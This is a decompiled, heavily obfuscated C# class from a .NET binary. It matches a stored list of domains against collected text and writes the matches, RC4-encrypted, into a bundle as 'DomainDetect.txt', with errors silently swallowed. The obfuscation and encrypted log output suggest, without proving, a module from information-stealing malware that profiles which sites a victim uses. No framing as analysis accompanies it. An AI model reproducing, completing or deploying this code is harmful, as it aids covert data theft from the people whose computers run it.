using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000004 RID: 4
	public class Class_2
	{
		// Token: 0x06000003 RID: 3 RVA: 0x0000205C File Offset: 0x0000025C
		public static void xmethod_1(string str_0)
		{
			try
			{
				Encoding utf = Encoding.UTF8;
				List<string> list = Class_84.\u030D\u0330\u033C\u0020\u031F\u031D\u0330\u031C\u030D\u0367\u034D\u034E\u0020\u0313\u0369\u0301gwiwfcicjnpkfscg\u035E\u0303\u0347\u0489\u0326\u033B\u033C\u0309\u0357\u0353\u0315\u032B\u030C\u0020\u0020\u036Fhgqzyevbtayubfox.Select(new Func<string, string>(Class_2.NClass_0.field_0.nmethod_2)).Where(new Func<string, bool>(Class_2.NClass_0.field_0.nmethod_3)).Select(new Func<string, string>(Class_2.NClass_0.field_0.nmethod_4)).ToList<string>();
				List<string> list2 = new List<string>();
				list2.Add(Class_49.field_0);
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list2)
				{
					foreach (string item in text.Split(Array.Empty<char>()).Select(new Func<string, string>(Class_2.NClass_0.field_0.nmethod_5)).Where(new Func<string, bool>(Class_2.NClass_0.field_0.nmethod_6)).Select(new Func<string, string>(Class_2.NClass_0.field_0.nmethod_7)).ToList<string>())
					{
						if (!hashSet.Contains(item))
						{
							hashSet.Add(item);
						}
					}
				}
				string text2 = "";
				foreach (string text3 in list)
				{
					using (HashSet<string>.Enumerator enumerator3 = hashSet.GetEnumerator())
					{
						while (enumerator3.MoveNext())
						{
							if (enumerator3.Current.Contains(text3) && !text2.Contains(text3))
							{
								text2 = text2 + text3 + Environment.NewLine;
							}
						}
					}
				}
				Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\DomainDetect.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text2)));
				Class_53.\u0020\u0313\u0353\u0020\u0E47\u031A\u0353\u0329\u033C\u0344\u034D\u0020\u0363\u036F\u031A\u0301awhgtmkxagkekicb\u0313\u0020\u0354\u032D\u035C\u0E47\u031A\u035Bt\u036B\u0E47\u036B\u0307\u035C\u0313\u0020riftwyloclvluvlf = text2;
				text2 = "";
			}
			catch
			{
			}
		}

		// Token: 0x02000005 RID: 5
		[CompilerGenerated]
		[Serializable]
		private sealed class NClass_0
		{
			// Token: 0x06000005 RID: 5 RVA: 0x00002370 File Offset: 0x00000570
			private static void nmethod_0()
			{
				Class_2.NClass_0.field_0 = new Class_2.NClass_0();
			}

			// Token: 0x06000006 RID: 6 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_1()
			{
				base..ctor();
			}

			// Token: 0x06000007 RID: 7 RVA: 0x00002384 File Offset: 0x00000584
			internal string nmethod_2(string str_0)
			{
				return str_0.Trim();
			}

			// Token: 0x06000008 RID: 8 RVA: 0x0000238C File Offset: 0x0000058C
			internal bool nmethod_3(string str_0)
			{
				return str_0 != "";
			}

			// Token: 0x06000009 RID: 9 RVA: 0x00002399 File Offset: 0x00000599
			internal string nmethod_4(string str_0)
			{
				return str_0.ToLower();
			}

			// Token: 0x0600000A RID: 10 RVA: 0x00002384 File Offset: 0x00000584
			internal string nmethod_5(string str_0)
			{
				return str_0.Trim();
			}

			// Token: 0x0600000B RID: 11 RVA: 0x0000238C File Offset: 0x0000058C
			internal bool nmethod_6(string str_0)
			{
				return str_0 != "";
			}

			// Token: 0x0600000C RID: 12 RVA: 0x00002399 File Offset: 0x00000599
			internal string nmethod_7(string str_0)
			{
				return str_0.ToLower();
			}

			// Token: 0x04000009 RID: 9
			public static readonly Class_2.NClass_0 field_0;

			// Token: 0x0400000A RID: 10
			public static Func<string, string> field_1;

			// Token: 0x0400000B RID: 11
			public static Func<string, bool> field_2;

			// Token: 0x0400000C RID: 12
			public static Func<string, string> field_3;

			// Token: 0x0400000D RID: 13
			public static Func<string, string> field_4;

			// Token: 0x0400000E RID: 14
			public static Func<string, bool> field_5;

			// Token: 0x0400000F RID: 15
			public static Func<string, string> field_6;
		}
	}
}
